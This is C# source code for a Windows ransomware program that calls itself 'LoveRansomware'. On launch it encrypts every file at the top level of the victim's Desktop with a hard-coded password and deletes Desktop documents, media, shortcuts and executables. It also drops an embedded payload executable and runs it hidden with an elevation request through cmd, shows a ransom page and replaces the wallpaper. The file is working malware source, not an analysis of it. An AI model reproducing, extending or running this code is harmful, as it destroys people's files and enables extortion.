using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using LoveRansomware.Rans.ChangeWallpaper;
using LoveRansomware.Rans.EncryptionLove;
using LoveRansomware.Rans.HTMLPayload;
using System.IO;
using System.Reflection;

namespace LoveRansomware
{
    public partial class RansomwareMainForm : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public void DeleteUrlFiles()
        {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            DirectoryInfo urlfold = new DirectoryInfo(desk);
            FileInfo[] urlxxfold = urlfold.GetFiles("*.url");
            foreach (FileInfo url_delete in urlxxfold)
            {
                url_delete.Attributes = FileAttributes.Normal;
                url_delete.Delete();
            }
        }
        public void DelOtherFilesinDesktop()
        {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            DirectoryInfo pdffiledelete = new DirectoryInfo(desk);
            FileInfo[] pdffile = pdffiledelete.GetFiles("*.pdf");
            foreach (FileInfo pdfdelete in pdffile)
            {
                pdfdelete.Attributes = FileAttributes.Normal;
                pdfdelete.Delete();
            }
            DirectoryInfo mp4formatfile = new DirectoryInfo(desk);
            FileInfo[] mp4del = mp4formatfile.GetFiles("*.mp4");
            foreach (FileInfo mmp4delete in mp4del)
            {
                mmp4delete.Attributes = FileAttributes.Normal;
                mmp4delete.Delete();
            }
            DirectoryInfo wavfile = new DirectoryInfo(desk);
            FileInfo[] wavv = wavfile.GetFiles("*.wav");
            foreach (FileInfo file in wavv)
            {
                file.Attributes = FileAttributes.Normal;
                file.Delete();
            }
            DirectoryInfo textfiles = new DirectoryInfo(desk);
            FileInfo[] gettextfiles = textfiles.GetFiles("*.txt");
            foreach (FileInfo txt in gettextfiles)
            {
                txt.Attributes = FileAttributes.Normal;
                txt.Delete();
            }
            DirectoryInfo jpegformat = new DirectoryInfo(desk);
            FileInfo[] fileJPEG = jpegformat.GetFiles("*.jpg");
            foreach (FileInfo jpgfile in fileJPEG)
            {
                jpgfile.Attributes = FileAttributes.Normal;
                jpgfile.Delete();
            }
            DirectoryInfo pngfile = new DirectoryInfo(desk);
            FileInfo[] filePNGinfo = pngfile.GetFiles("*.png");
            foreach (FileInfo png123 in filePNGinfo)
            {
                png123.Attributes = FileAttributes.Normal;
                png123.Delete();
            }
            DirectoryInfo rtf = new DirectoryInfo(desk);
            if (rtf.Exists)
            {
                FileInfo[] fileRTF = rtf.GetFiles("*.rtf");
                foreach (FileInfo rtf123 in fileRTF)
                {
                    rtf123.Attributes = FileAttributes.Normal;
                    rtf123.Delete();
                }
            }
            DirectoryInfo linkfolder = new DirectoryInfo(desk);
            FileInfo[] lnkfold = linkfolder.GetFiles("*.lnk");
            foreach (FileInfo lnk in lnkfold)
            {
                lnk.Attributes = FileAttributes.Normal;
                lnk.Delete();
            }
            DirectoryInfo photoshop = new DirectoryInfo(desk);
            FileInfo[] phot = photoshop.GetFiles("*.psd");
            foreach (FileInfo psd in phot)
            {
                psd.Attributes = FileAttributes.Normal;
                psd.Delete();
            }
            DirectoryInfo xexe = new DirectoryInfo(desk);
            FileInfo[] exe = xexe.GetFiles("*.exe");
            foreach (FileInfo info in exe)
            {
                info.Attributes = FileAttributes.Normal;
                info.Delete();
            }
        }
        public void StartInfectionFiles()
        {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.TopDirectoryOnly);

                EncryptionLove enc = new EncryptionLove();

                string password = Encoding.ASCII.GetBytes("Jerren23443").ToString(); //this is password to decrypt your files :D
                for (int i = 0; i < files.Length; i++)
                {
                    enc.FileEncrypt(files[i], password);
                }
        }
        public RansomwareMainForm()
        {
            string indx = "index.html";
            string love = "LoveRansomware.mp3";
            string wallpaper = "loverans_wallpaper.jpg";
            Directory.CreateDirectory(@"C:\Temp");
            if (Directory.Exists("C:\\Temp"))
            {
                Directory.CreateDirectory(@"C:\Temp\LoveRans");
                Directory.CreateDirectory(@"C:\Temp\LoveRans\mp3");
                Extract("LoveRansomware", @"C:\Temp", "Resources", "LoveRansPayload.exe");
                Extract("LoveRansomware", @"C:\Temp\LoveRans", "Resources", indx);
                Extract("LoveRansomware", @"C:\Temp\LoveRans", "Resources", love);
                Extract("LoveRansomware", @"C:\Temp", "Resources", wallpaper);
                if (Directory.Exists(@"C:\Temp\LoveRans\mp3"))
                {
                    if (File.Exists(@"C:\Temp\LoveRans\mp3\LoveRansomware.mp3"))
                    {
                        File.Delete(@"C:\Temp\LoveRans\mp3\LoveRansomware.mp3");
                    }
                    File.Copy(@"C:\Temp\LoveRans\LoveRansomware.mp3", @"C:\Temp\LoveRans\mp3\LoveRansomware.mp3");
                    File.Delete(@"C:\Temp\LoveRans\LoveRansomware.mp3");
                }
            }
            StartInfectionFiles();
            DeleteUrlFiles();
            DelOtherFilesinDesktop();
            HTMLPayload html = new HTMLPayload();
            html.ShowHTMLFile();
            ProcessStartInfo x = new ProcessStartInfo();
            x.FileName = "cmd";
            x.Arguments = @"/c start C:\Temp\LoveRansPayload.exe";
            x.WindowStyle = ProcessWindowStyle.Hidden;
            x.Verb = "runas";
            Process.Start(x);
            ChngWallpaperLoveRans rans = new ChngWallpaperLoveRans();
            rans.SetWallpaper(@"C:\Temp\loverans_wallpaper.jpg");
            rans.SetTileWallpaper();
            Environment.Exit(45);
            InitializeComponent();
        }
    }
}
